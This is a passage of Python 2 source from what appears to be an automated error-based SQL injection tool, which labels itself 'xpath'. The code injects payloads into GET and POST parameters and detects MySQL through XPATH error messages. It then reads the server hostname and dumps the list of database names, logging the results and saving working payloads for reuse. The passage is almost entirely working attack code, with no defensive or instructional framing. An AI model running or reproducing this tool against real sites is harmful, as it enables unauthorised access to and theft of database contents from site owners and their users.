                                        # ----------------------------------------
                                        # for later usage of dumiping other things
                                        CreatePayloadFile()
                                        with open(payload,'w') as ft:
                                            ft.write('%s' % tgt)
                                            ft.close()
                                        # ----------------------------------------
                                        print fw + sn + '---'
                                        infos += '---\n'
                                    
                                except IndexError as e:
                                    pass
                                except Exception as e:
                                    #print '[-] %s' % e
                                    pass
                                except KeyboardInterrupt:
                                    KeyBoardInterrupt()
                                    break
                                else:
                                    Query_Test = False
                                    print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] the back-end DBMS is MySQL"
                                    if wsr and war:
                                        print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s, %s" % (war, wsr)
                                        infos += "web server technology: %s, %s\n" % (war, wsr)
                                    else:
                                        print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s" % wsr
                                        infos += "web server technology: %s\n" % wsr
                                    infos += "the back-end DBMS is MySQL\n"
                                    print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetching server hostname"
                                    for QueryIndex in HOSTNAMES:
                                        if not Query_Test:
                                            QueryToTest = ('%s' % QueryIndex)
                                            if '0x72306f74' in tgt:
                                                FinalCountQuery_replaced = tgt.replace('0x72306f74', QueryToTest)
                                                try:
                                                    req = Request(url, data=FinalCountQuery_replaced, headers={'User-agent':ua})
                                                    resp = urlopen(req, timeout=10)
                                                except URLError as e:
                                                    URLError()
                                                    sleep(1)
                                                    pass
                                                except HTTPError as e:
##                                                    print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
                                                    sleep(1)
                                                    pass
                                                except (IOError, httplib.HTTPException) as e:
                                                    ConnTimeOut()
                                                    pass
                                                except KeyboardInterrupt:
                                                    KeyBoardInterrupt()
                                                    break
                                                else:
                                                    try:
                                                        respdata = resp.read()
                                                        host = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
                                                        if 'XPATH syntax error' in respdata:
                                                            Query_Test = True
                                                            print fg + sb + "["+strftime("%H:%M:%S")+"] [INFO] retrieved: %s" % host
                                                            infos += "hostname: %s\n" % host
                                                            print fg + sb + "hostname: '%s'" % host
                                                    except IndexError as e:
                                                        pass
                                                    except Exception as e:
##                                                        print '[-] %s' % e
##                                                        sys.exit(0)
                                                        pass
                                                    except KeyboardInterrupt:
                                                        KeyBoardInterrupt()
                                                        break
                                        if Query_Test:
                                            break            
                        if vul:
                            break
                    except (TypeError, IOError, IndexError):
                        pass
                    except KeyboardInterrupt:
                        KeyBoardInterrupt()
                        break
                    
            f.write(infos)
            f.close()
            print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % target
            
        else:
            print fw + sn + "xpath resumed the following injection point(s) from stored session:"
            infos += "\nxpath resumed the following injection point(s) from stored session:\n"
            with open(logs, "r") as prev_session:
                for line in islice(prev_session,1,7):
                    out = line.rstrip()
                    if out:
                        print fw + sn + out
                        infos += out+"\n"
            prev_session.close()
            HTTPResponses(url, data)
            Query_Test = False
            tempfread = tempf.readline()
            print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] the back-end DBMS is MySQL"
            if wsr and war:
                print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s, %s" % (war, wsr)
                infos += "web server technology: %s, %s\n" % (war, wsr)
            else:
                print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s" % wsr
                infos += "web server technology: %s\n" % wsr
            infos += "the back-end DBMS is MySQL\n"
            print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetching server hostname"
            for QueryIndex in HOSTNAMES:
                if not Query_Test:
                    QueryToTest = ('%s' % QueryIndex)
                    if '0x72306f74' in tempfread:
                        FinalCountQuery_replaced = tempfread.replace('0x72306f74', QueryToTest)
                        try:
                            req = Request(url, data=FinalCountQuery_replaced, headers={'User-agent':ua})
                            resp = urlopen(req, timeout=10)
                        except URLError as e:
                            URLError()
                            sleep(1)
                            pass
                        except HTTPError as e:
##                            print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
                            sleep(1)
                            pass
                        except (IOError, httplib.HTTPException) as e:
                            ConnTimeOut()
                            pass
                        except KeyboardInterrupt:
                            KeyBoardInterrupt()
                            break
                        else:
                            try:
                                respdata = resp.read()
                                host = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
                                if 'XPATH syntax error' in respdata:
                                    Query_Test = True
                                    print fg + sb + "["+strftime("%H:%M:%S")+"] [INFO] retrieved: %s" % host
                                    infos += "hostname:  %s\n" % host
                                    print fg + sb + "hostname:  '%s'" % host
                                    
                            except IndexError as e:
                                pass
                            except Exception as e:
                                #print '[-] %s' % e
                                #sys.exit(0)
                                pass
                            except KeyboardInterrupt:
                                KeyBoardInterrupt()
                                break
                if Query_Test:
                    break
            tempf.close()
            f.write(infos)
            f.close()
            print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % target
            infos = ""
        
    else:
        pass


def dumpDbs(url, data):
    global list_of_dbs
    list_of_dbs = []
    global war,wsr
    global logs,payload
    HTTPReqCount = 0
    infos = ""
###----------------------------------------
    f = open(logs,'a')              
#------------------------------------------
## ------------------------------------------------------------------------------------------------
##                              GET DATA INJECTION
## ------------------------------------------------------------------------------------------------
    if url != None and data == None:
        try:
            ## have to generate each file with website name to save payload
            tempf = open(payload,'r')
        except (Exception, IOError) as e:
            if 'No such file or directory' in e:
                vul = False
                for prefix, query, sufix, inline_comment in product(PREFIXES, TESTS, SUFIXES, (False, True)):
                    try:
                        if not vul:
                            temp = ("%s%s%s" % (prefix, query, sufix)).replace(" " if inline_comment else "/**/","/**/")
                            if '*' in url:
                                first, last = url.split('*')
                                tgt = first + temp + last
                                #print fc + sn + "["+strftime("%H:%M:%S")+"] [INFO] testing injection on user define parameter: (GET)" 
                            else:
                                tgt = url + temp

                            try:
                                print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] testing '" + fg + sn + test + fg + sn + "'"
                                req = Request(tgt, headers={'User-agent':ua})
                                HTTPReqCount += 1
                                resp = urlopen(req, timeout=10)
                            except URLError as e:
                                URLError()
                                sleep(1)
                                pass
                            except HTTPError as e:
##                                print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
                                sleep(1)
                                pass
                            except (IOError, httplib.HTTPException) as e:
                                ConnTimeOut()
                                pass
                            except KeyboardInterrupt:
                                KeyBoardInterrupt()
                                break
                            else:
                                try:
                                    respdata = resp.read()
                                    retVal = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
                                    if 'XPATH syntax error' in respdata:
                                        vul = True
                                        print fg + sb + 'xpath identified the following injection point(s) with a total of %d HTTP(s) requests:' % HTTPReqCount
                                        infos += 'xpath identified the following injection point(s) with a total of %d HTTP(s) requests:\n' % HTTPReqCount
                                        print fw + sn + '---'
                                        infos += '---\n'
                                        print fw + sn + 'Parameter: (GET)'
                                        infos += 'Parameter: (GET)\n'
                                        print fw + sn + '\tType: error-based'
                                        infos += '\tType: error-based\n'
                                        print fw + sn + '\tTitle: %s' % test
                                        infos += '\tTitle: %s\n' % test
                                        print fw + sn + '\tPayload: %s' % tgt
                                        infos += '\tPayload: %s\n' % tgt
                                        # ----------------------------------------
                                        # for later usage of dumiping other things
                                        CreatePayloadFile()
                                        with open(payload,'w') as ft:
                                            ft.write('%s' % tgt)
                                            ft.close()
                                        # ----------------------------------------
                                        print fw + sn + '---'
                                        infos += '---\n'
                                except IndexError as e:
                                    pass
                                except Exception as e:
##                                    print '[-] %s' % e
                                    pass
                                except KeyboardInterrupt:
                                    KeyBoardInterrupt()
                                    break
                                else:
                                    Query_Test = False
                                    if wsr and war:
                                        print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s, %s" % (war, wsr)
                                        infos += "web server technology: %s, %s\n" % (war, wsr)
                                    else:
                                        print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s" % wsr
                                        infos += "web server technology: %s\n" % wsr
                                    print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] the back-end DBMS: MySQL"
                                    infos += "the back-end DBMS: MySQL\n"
                                    print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetching database names"
                                    print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetching number of databases"
                                    for QueryIndex, inline_comment in product(DB_COUNT, (False, True)):
                                        if not Query_Test:
                                            QueryToTest = ('%s' % QueryIndex).replace(" " if inline_comment else "/**/","/**/")
                                            if '0x72306f74' in tgt:
                                                FinalCountQuery_replaced = tgt.replace('0x72306f74', QueryToTest)
                                                try:
                                                    req = Request(FinalCountQuery_replaced, headers={'User-agent':ua})
                                                    resp = urlopen(req, timeout=10)
                                                except URLError as e:
                                                    URLError()
                                                    sleep(1)
                                                    pass
                                                except HTTPError as e:
##                                                    print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
                                                    sleep(1)
                                                    pass
                                                except (IOError, httplib.HTTPException) as e:
                                                    ConnTimeOut()
                                                    pass
                                                except KeyboardInterrupt:
                                                    KeyBoardInterrupt()
                                                    break
                                                else:
                                                    try:
                                                        respdata = resp.read()
                                                        no_of_dbs = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
                                                        if 'XPATH syntax error' in respdata:
                                                            Query_Test = True
                                                            QueryToDumpDbNames = FinalCountQuery_replaced
                                                            print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] retrieved: %s" % no_of_dbs
                                                            dbvul = False
                                                            for QueryIndex, inline_comment in product(DB_NAMES, (False, True)):
                                                                if not dbvul:
                                                                    QueryToTest = ('%s' % QueryIndex).replace(" " if inline_comment else "/**/","/**/")
                                                                    if '0x72306f74' in tgt:
                                                                        FinalCountQuery_replaced = tgt.replace('0x72306f74', QueryToTest)
                                                                        try:
                                                                            req = Request(FinalCountQuery_replaced, headers={'User-agent':ua})
                                                                            resp = urlopen(req, timeout=10)
                                                                        except URLError as e:
                                                                            URLError()
                                                                            sleep(1)
                                                                            pass
                                                                        except HTTPError as e:
##                                                                            print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
                                                                            sleep(1)
                                                                            pass
                                                                        except (IOError, httplib.HTTPException) as e:
                                                                            ConnTimeOut()
                                                                            pass
                                                                        except KeyboardInterrupt:
                                                                            KeyBoardInterrupt()
                                                                            break
                                                                        else:
                                                                            try:
                                                                                respdata = resp.read()
                                                                                isTrue_dbs = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
                                                                                if 'XPATH syntax error' in respdata:
                                                                                    dbvul = True
                                                                                    DbDumpQuery = FinalCountQuery_replaced
                                                                                    temp = 0
                                                                                    nod = int(no_of_dbs)
                                                                                    infos += "available databases ["+str(nod)+"]:\n"
                                                                                    tmp = ""
                                                                                    while temp < nod:
                                                                                        if 'LIMIT/**_**/0' in DbDumpQuery:
                                                                                            tempQuery = DbDumpQuery.replace('LIMIT/**_**/0','LIMIT/**_**/%d' % temp)
                                                                                        elif 'LIMIT%200' in DbDumpQuery:
                                                                                            tempQuery = DbDumpQuery.replace('LIMIT%200','LIMIT%20'+str(temp))
                                                                                        else:
                                                                                            tempQuery = DbDumpQuery.replace('LIMIT+0','LIMIT+%d' % temp)
                                                                                            
                                                                                        try:
                                                                                            req = Request(tempQuery, headers={'User-agent':ua})
                                                                                            resp = urlopen(req, timeout=10)
                                                                                        except URLError as e:
                                                                                            URLError()
                                                                                            if temp == 0:
                                                                                                temp = 0
                                                                                            else:
                                                                                                temp = temp
                                                                                            sleep(1)
                                                                                            pass
                                                                                        except HTTPError as e:
##                                                                                            print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
                                                                                            sleep(1)
                                                                                            pass
                                                                                        except (IOError, httplib.HTTPException) as e:
                                                                                            ConnTimeOut()
                                                                                            if temp == 0:
                                                                                                temp=0
                                                                                            else:
                                                                                                temp = temp
                                                                                            pass
                                                                                        except KeyboardInterrupt:
                                                                                            print fg + sb + "available databases ["+str(nod)+"]:"
                                                                                            print fg + sb + tmp
                                                                                            f.write(infos)
                                                                                            f.close()
                                                                                            print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % target
                                                                                            KeyBoardInterrupt()
                                                                                            break
                                                                                        else:
                                                                                            try:
                                                                                                respdata = resp.read()
                                                                                                name_of_dbs = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
                                                                                                if 'XPATH syntax error' in respdata:
                                                                                                    print fg + sb + "["+strftime("%H:%M:%S")+"] [INFO] retrieved: %s" % name_of_dbs
                                                                                                    infos += "[*] %s\n" % name_of_dbs
                                                                                                    tmp += "[*] %s\n" % name_of_dbs
                                                                                                    list_of_dbs.append(name_of_dbs)
                                                                                                    temp += 1
                                                                                                    
                                                                                            except IndexError as e:
                                                                                                pass
                                                                                            except Exception as e:
                                                                                                #print '[-] %s' % e
                                                                                                sys.exit(0)
                                                                                                pass
                                                                                            except KeyboardInterrupt:
                                                                                                KeyBoardInterrupt()
                                                                                                break
                                                                                    print fg + sb + "available databases ["+str(nod)+"]:"
                                                                                    print fg + sb + tmp
                                                                                        
                                                                            except IndexError as e:
                                                                                pass
                                                                            except Exception as e:
                                                                                print '[-] %s' % e
                                                                                sys.exit(0)
                                                                                pass
                                                                            except KeyboardInterrupt:
                                                                                KeyBoardInterrupt()
                                                                                break
                                                                if dbvul:
                                                                    break
                                                    except IndexError as e:
                                                        pass
                                                    except Exception as e:
                                                        print '[-] %s' % e
                                                        sys.exit(0)
                                                    except KeyboardInterrupt:
                                                        KeyBoardInterrupt()
                                                        break
                                        if Query_Test:
                                            break            
                        if vul:
                            break
                    except (TypeError, IOError, IndexError):
                        pass
                    except KeyboardInterrupt:
                        KeyBoardInterrupt()
                        break      
            f.write(infos) 
            f.close()
            print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % target
            
        else:   
            print fw + sn + "xpath resumed the following injection point(s) from stored session:"
            infos += "\nxpath resumed the following injection point(s) from stored session:\n"
            with open(logs, "r") as prev_session:
                for line in islice(prev_session,1,7):
                    out = line.rstrip()
                    if out:
                        print fw + sn + out
                        infos += out+"\n"
            prev_session.close()
            Query_Test = False
            tempfread = tempf.readline()
            url = None
            if wsr and war:
                print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s, %s" % (war, wsr)
                infos += "web server technology: %s, %s\n" % (war, wsr)
            else:
                print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s" % wsr
                infos += "web server technology: %s\n" % wsr
            print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] the back-end DBMS: MySQL"
            infos += "the back-end DBMS: MySQL\n"
            print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetching database names"
            print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetching number of databases"
            for QueryIndex, inline_comment in product(DB_COUNT, (False, True)):
                if not Query_Test:
                    QueryToTest = ('%s' % QueryIndex).replace(" " if inline_comment else "/**/","/**/")
                    if '0x72306f74' in tempfread:
                        FinalCountQuery_replaced = tempfread.replace('0x72306f74', QueryToTest)
                        try:
                            req = Request(FinalCountQuery_replaced, headers={'User-agent':ua})
                            resp = urlopen(req, timeout=10)
                        except URLError as e:
                            URLError()
                            sleep(1)
                            pass
                        except HTTPError as e:
##                            print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
                            sleep(1)
                            pass
                        except (IOError, httplib.HTTPException) as e:
                            ConnTimeOut()
                            pass
                        except KeyboardInterrupt:
                            KeyBoardInterrupt()
                            break
                        else:
                            try:
                                respdata = resp.read()
                                no_of_dbs = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
                                if 'XPATH syntax error' in respdata:
                                    Query_Test = True
                                    print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] retrieved: %s" % no_of_dbs
                                    dbvul = False
                                    for QueryIndex, inline_comment in product(DB_NAMES, (False, True)):
                                        if not dbvul:
                                            QueryToTest = ('%s' % QueryIndex).replace(" " if inline_comment else "/**/","/**/")
                                            if '0x72306f74' in tempfread:
                                                FinalCountQuery_replaced = tempfread.replace('0x72306f74', QueryToTest)
                                                try:
                                                    req = Request(FinalCountQuery_replaced, headers={'User-agent':ua})
                                                    resp = urlopen(req, timeout=10)
                                                except URLError as e:
                                                    URLError()
                                                    sleep(1)
                                                    pass
                                                except HTTPError as e:
##                                                    print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
                                                    sleep(1)
                                                    pass
                                                except (IOError, httplib.HTTPException) as e:
                                                    ConnTimeOut()
                                                    pass
                                                except KeyboardInterrupt:
                                                    KeyBoardInterrupt()
                                                    break
                                                else:
                                                    try:
                                                        respdata = resp.read()
                                                        isTrue_dbs = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
                                                        if 'XPATH syntax error' in respdata:
                                                            dbvul = True
                                                            DbDumpQuery = FinalCountQuery_replaced
                                                            temp = 0
                                                            nod = int(no_of_dbs)
                                                            infos += "available databases ["+str(nod)+"]:\n"
                                                            tmp = ""
                                                            while temp < nod:
                                                                if 'LIMIT/**_**/0' in DbDumpQuery:
                                                                    tempQuery = DbDumpQuery.replace('LIMIT/**_**/0','LIMIT/**_**/%d' % temp)
                                                                elif 'LIMIT%200' in DbDumpQuery:
                                                                    tempQuery = DbDumpQuery.replace('LIMIT%200','LIMIT%20'+str(temp))
                                                                else:
                                                                    tempQuery = DbDumpQuery.replace('LIMIT+0','LIMIT+%d' % temp)
                                                                    
                                                                try:
                                                                    req = Request(tempQuery, headers={'User-agent':ua})
                                                                    resp = urlopen(req, timeout=10)
                                                                except URLError as e:
                                                                    URLError()
                                                                    if temp == 0:
                                                                        temp = 0
                                                                    else:
                                                                        temp = temp
                                                                    sleep(1)
                                                                    pass
                                                                except HTTPError as e:
##                                                                    print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
                                                                    sleep(1)
                                                                    pass
                                                                except (IOError, httplib.HTTPException) as e:
                                                                    ConnTimeOut()
                                                                    if temp == 0:
                                                                        temp = 0
                                                                    else:
                                                                        temp = temp
                                                                    pass
                                                                except KeyboardInterrupt:
                                                                    print fw + sn + "available databases ["+str(nod)+"]:"
                                                                    print fw + sn + tmp
                                                                    f.write(infos)
                                                                    f.close()
                                                                    print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % target
                                                                    KeyBoardInterrupt()
                                                                    break
                                                                else:
                                                                    try:
                                                                        respdata = resp.read()
                                                                        name_of_dbs = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
                                                                        if 'XPATH syntax error' in respdata:
                                                                            print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] retrieved: %s" % name_of_dbs
                                                                            infos += "[*] %s\n" % name_of_dbs
                                                                            tmp += "[*] %s\n" % name_of_dbs
                                                                            list_of_dbs.append(name_of_dbs)
                                                                            temp += 1
                                                                            
                                                                    except IndexError as e:
                                                                        pass
                                                                    except Exception as e:
##                                                                        print '[-] %s' % e
##                                                                        sys.exit(0)
                                                                        pass
                                                                    except KeyboardInterrupt:
                                                                        KeyBoardInterrupt()
                                                                        break
                                                                #temp += 1
                                                            print fw + sn + "available databases ["+str(nod)+"]:"
                                                            print fw + sn + tmp
                                                                
                                                    except IndexError as e:
                                                        pass
                                                    except Exception as e:
                                                        #print '[-] %s' % e
                                                        #sys.exit(0)
                                                        pass
                                                    except KeyboardInterrupt:
                                                        KeyBoardInterrupt()
                                                        break
                                        if dbvul:
                                            break
                            except IndexError as e:
                                pass
                            except Exception as e:
                                #print '[-] %s' % e
                                #sys.exit(0)
                                pass
                            except KeyboardInterrupt:
                                KeyBoardInterrupt()
                                break
                if Query_Test:
                    break
            tempf.close()
            f.write(infos)
            f.close()
            print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % target
            infos = ""
## ------------------------------------------------------------------------------------------------
##                              POST DATA INJECTION
## ------------------------------------------------------------------------------------------------
    elif url != None and data != None:
        try:
            ## have to generate each file with website name to save payload
            tempf = open(payload,'r')
        except (Exception, IOError) as e:
            if 'No such file or directory' in e:
                vul = False
                for prefix, query, sufix, inline_comment in product(PREFIXES, TESTS, SUFIXES, (False, True)):
                    try:
                        if not vul:
                            temp = ("%s%s%s" % (prefix, query, sufix)).replace(" " if inline_comment else "/**/","/**/")
                            if '*' in data:
                                first, last = data.split('*')
                                tgt = first + temp + last
                                #print fc + sn + "["+strftime("%H:%M:%S")+"] [INFO] testing injection on user define parameter: (POST)" 
                            else:
                                tgt = data + temp

                            try:
                                print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] testing '"+ fg + sn + test + fg + sn + "'"
                                req = Request(url, data=tgt, headers={'User-agent':ua})
                                HTTPReqCount += 1
                                resp = urlopen(req, timeout=10)
                            except URLError as e:
                                URLError()
                                sleep(1)
                                pass
                            except HTTPError as e:
##                                print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
                                sleep(1)
                                pass
                            except (IOError, httplib.HTTPException) as e:
                                ConnTimeOut()
                                pass
                            except KeyboardInterrupt:
                                KeyBoardInterrupt()
                                break   
                            else:
                                try:
                                    respdata = resp.read()
                                    retVal = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
                                    if 'XPATH syntax error' in respdata:
                                        vul = True
                                        print fg + sb + 'xpath identified the following injection point(s) with a total of %d HTTP(s) requests:' % HTTPReqCount
                                        infos += 'xpath identified the following injection point(s) with a total of %d HTTP(s) requests:\n' % HTTPReqCount
                                        print fw + sn + '---'
                                        infos += '---\n'
                                        print fw + sn + 'Parameter: (GET)'
                                        infos += 'Parameter: (GET)\n'
                                        print fw + sn + '\tType: error-based'
                                        infos += '\tType: error-based\n'
                                        print fw + sn + '\tTitle: %s' % test
                                        infos += '\tTitle: %s\n' % test
                                        print fw + sn + '\tPayload: %s' % tgt
                                        infos += '\tPayload: %s\n' % tgt
                                        # ----------------------------------------
                                        # for later usage of dumiping other things
                                        CreatePayloadFile()
                                        with open(payload,'w') as ft:
                                            ft.write('%s' % tgt)
                                            ft.close()
                                        # ----------------------------------------
                                        print fw + sn + '---'
                                        infos += '---\n'
                                    
                                except IndexError as e:
                                    pass
                                except Exception as e:
                                    #print '[-] %s' % e
                                    pass
                                except KeyboardInterrupt:
                                    KeyBoardInterrupt()
                                    break
                                else:
                                    Query_Test = False
                                    if wsr and war:
                                        print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s, %s" % (war, wsr)
                                        infos += "web server technology: %s, %s\n" % (war, wsr)
                                    else:
                                        print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s" % wsr
                                        infos += "web server technology: %s\n" % wsr
                                    print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] the back-end DBMS: MySQL"
                                    infos += "the back-end DBMS: MySQL\n"
                                    print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetching database names"
                                    print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetching number of databases"
                                    for QueryIndex, inline_comment in product(DB_COUNT, (False, True)):
                                        if not Query_Test:
                                            QueryToTest = ('%s' % QueryIndex).replace(" " if inline_comment else "/**/","/**/")
                                            if '0x72306f74' in tgt:
                                                FinalCountQuery_replaced = tgt.replace('0x72306f74', QueryToTest)
                                                try:
                                                    req = Request(url, data=FinalCountQuery_replaced, headers={'User-agent':ua})
                                                    resp = urlopen(req, timeout=10)
                                                except URLError as e:
                                                    URLError()
                                                    sleep(1)
                                                    pass
                                                except HTTPError as e:
##                                                    print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
                                                    sleep(1)
                                                    pass
                                                except (IOError, httplib.HTTPException) as e:
                                                    ConnTimeOut()
                                                    pass
                                                except KeyboardInterrupt:
                                                    KeyBoardInterrupt()
                                                    break
                                                else:
                                                    try:
                                                        respdata = resp.read()
                                                        no_of_dbs = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
                                                        if 'XPATH syntax error' in respdata:
                                                            Query_Test = True
                                                            print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] retrieved: %s" % no_of_dbs
                                                            dbvul = False
                                                            for QueryIndex, inline_comment in product(DB_NAMES, (False, True)):
                                                                if not dbvul:
                                                                    QueryToTest = ('%s' % QueryIndex).replace(" " if inline_comment else "/**/","/**/")
                                                                    if '0x72306f74' in tgt:
                                                                        FinalDumpQuery_replaced = tgt.replace('0x72306f74', QueryToTest)
                                                                        try:
                                                                            req = Request(url, data=FinalDumpQuery_replaced, headers={'User-agent':ua})
                                                                            resp = urlopen(req, timeout=10)
                                                                        except URLError as e:
                                                                            URLError()
                                                                            sleep(1)
                                                                            pass
                                                                        except HTTPError as e:
##                                                                            print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
                                                                            sleep(1)
                                                                            pass
                                                                        except (IOError, httplib.HTTPException) as e:
                                                                            ConnTimeOut()
                                                                            pass
                                                                        except KeyboardInterrupt:
                                                                            KeyBoardInterrupt()
                                                                            break
                                                                        else:
                                                                            try:
                                                                                respdata = resp.read()
                                                                                isTrue_dbs = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
                                                                                if 'XPATH syntax error' in respdata:
                                                                                    dbvul = True
                                                                                    DbDumpQuery = FinalDumpQuery_replaced
                                                                                    temp = 0
                                                                                    nod = int(no_of_dbs)
                                                                                    infos += "available databases ["+str(nod)+"]:\n"
                                                                                    tmp = ""
                                                                                    while temp < nod:
                                                                                        if 'LIMIT/**_**/0' in DbDumpQuery:
                                                                                            tempQuery = DbDumpQuery.replace('LIMIT/**_**/0','LIMIT/**_**/%d' % temp)
                                                                                        elif 'LIMIT%200' in DbDumpQuery:
                                                                                            tempQuery = DbDumpQuery.replace('LIMIT%200','LIMIT%20'+str(temp))
                                                                                        else:
                                                                                            tempQuery = DbDumpQuery.replace('LIMIT+0','LIMIT+%d' % temp)

                                                                                        try:
                                                                                            req = Request(url, data=tempQuery, headers={'User-agent':ua})
                                                                                            resp = urlopen(req, timeout=10)
                                                                                        except URLError as e:
                                                                                            URLError()
                                                                                            if temp == 0:
                                                                                                temp = 0
                                                                                            else:
                                                                                                temp = temp
                                                                                            sleep(1)
                                                                                            pass
                                                                                        except HTTPError as e:
##                                                                                            print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
                                                                                            sleep(1)
                                                                                            pass
                                                                                        except (IOError, httplib.HTTPException) as e:
                                                                                            ConnTimeOut()
                                                                                            if temp == 0:
                                                                                                temp = 0
                                                                                            else:
                                                                                                temp = temp
                                                                                            pass
                                                                                        except KeyboardInterrupt:
                                                                                            print fg + sb + "available databases ["+str(nod)+"]:"
                                                                                            print fg + sb + tmp
                                                                                            f.write(infos)
                                                                                            f.close()
                                                                                            print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % target
                                                                                            KeyBoardInterrupt()
                                                                                            break
                                                                                        else:
                                                                                            try:
                                                                                                respdata = resp.read()
                                                                                                name_of_dbs = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
                                                                                                if 'XPATH syntax error' in respdata:
                                                                                                    print fg + sb + "["+strftime("%H:%M:%S")+"] [INFO] retrieved: %s" % name_of_dbs
                                                                                                    infos += "[*] %s\n" % name_of_dbs
                                                                                                    tmp += "[*] %s\n" % name_of_dbs
                                                                                                    list_of_dbs.append(name_of_dbs)
                                                                                                    temp += 1
                                                                                                    
                                                                                            except IndexError as e:
                                                                                                pass
                                                                                            except Exception as e:
##                                                                                                print '[-] %s' % e
##                                                                                                sys.exit(0)
                                                                                                pass
                                                                                            except KeyboardInterrupt:
                                                                                                KeyBoardInterrupt()
                                                                                                break
                                                                                            
                                                                                    print fg + sb + "available databases ["+str(nod)+"]:"
                                                                                    print fg + sb + tmp
                                                                                        
                                                                            except IndexError as e:
                                                                                pass
                                                                            except Exception as e:
                                                                                #print '[-] %s' % e
                                                                                #sys.exit(0)
                                                                                pass
                                                                            except KeyboardInterrupt:
                                                                                KeyBoardInterrupt()
                                                                                break
                                                                if dbvul:
                                                                    break
                                                    except IndexError as e:
                                                        pass
                                                    except Exception as e:
                                                        #print '[-] %s' % e
                                                        #sys.exit(0)
                                                        pass
                                                    except KeyboardInterrupt:
                                                        KeyBoardInterrupt()
                                                        break
                                        if Query_Test:
                                            break            
                        if vul:
                            break
                    except (TypeError, IOError, IndexError):
                        pass
                    except KeyboardInterrupt:
                        KeyBoardInterrupt()
                        break
                    
            f.write(infos)
            f.close()
            print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % target
            
        else:
            print fw + sn + "xpath resumed the following injection point(s) from stored session:"
            infos += "\nxpath resumed the following injection point(s) from stored session:\n"
            with open(logs, "r") as prev_session:
                for line in islice(prev_session,1,7):
                    out = line.rstrip()
                    if out:
                        print fw + sn + out
                        infos += out+"\n"
            prev_session.close()
            HTTPResponses(url, data)
            Query_Test = False
            tempfread = tempf.readline()
            if wsr and war:
                print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s, %s" % (war, wsr)
                infos += "web server technology: %s, %s\n" % (war, wsr)
            else:
